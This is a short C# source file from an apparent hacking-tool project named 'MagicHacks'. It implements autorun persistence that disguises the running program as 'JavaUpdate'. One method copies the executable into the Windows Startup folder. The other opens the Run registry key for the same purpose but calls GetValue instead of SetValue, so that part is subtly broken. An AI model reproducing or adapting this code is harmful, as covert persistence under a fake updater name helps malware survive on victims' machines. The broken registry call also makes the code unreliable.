using System;
using System.IO;
using System.Text;
using Microsoft.Win32;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace MagicHacks.cCore.Autorun
{
    internal sealed class cAutorun
    {
        public static void Reg()
        {
            try
            {
                RegistryKey regs = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                regs.GetValue("JavaUpdate", Application.ExecutablePath);
                Console.WriteLine("Registry Autorun work!");
                Console.ReadKey();
            }
            catch { }
        }

        public static void StartUpFolder()
        {
            try
            {
                string sPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\JavaUpdate.exe";
                string sExecute = System.Reflection.Assembly.GetExecutingAssembly().Location;

                File.Copy(sExecute, sPath);
                Console.WriteLine("Startup Autorun work!");
                Console.ReadKey();
            }
            catch { }
        }
    }
}
